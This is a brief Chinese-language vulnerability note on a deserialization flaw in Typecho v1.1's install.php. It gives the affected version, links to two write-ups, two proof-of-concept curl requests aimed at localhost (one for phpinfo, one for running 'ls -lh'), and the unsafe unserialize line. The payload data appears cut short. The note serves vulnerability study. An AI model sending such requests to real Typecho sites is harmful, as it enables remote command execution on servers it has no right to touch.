## typecho v1.1

## 反序列化漏洞

影响版本

* v1.1-15.5.12-beta

参考链接

* [Typecho install.php存在的反序列化漏洞分析（含EXP）](http://www.freebuf.com/vuls/155753.html)
* [Typecho反序列化漏洞导致前台getshell](http://www.freebuf.com/vuls/152058.html)

Poc

```
# phpinfo
curl 127.0.0.1/install.php?finish=1 --data '__typecho_%3d' -H 'Referer: http://127.0.0.1/install.php'

# 执行命令
curl 127.0.0.1/install.php?finish=1 --data '__typecho_&0=ls+-lh' -H 'Referer: http://127.0.0.1/install.php'
```

关键代码

```
# 直接反序列化用户输入
$config = unserialize(base64_decode(Typecho_Cookie::get('__typecho_config')));
```
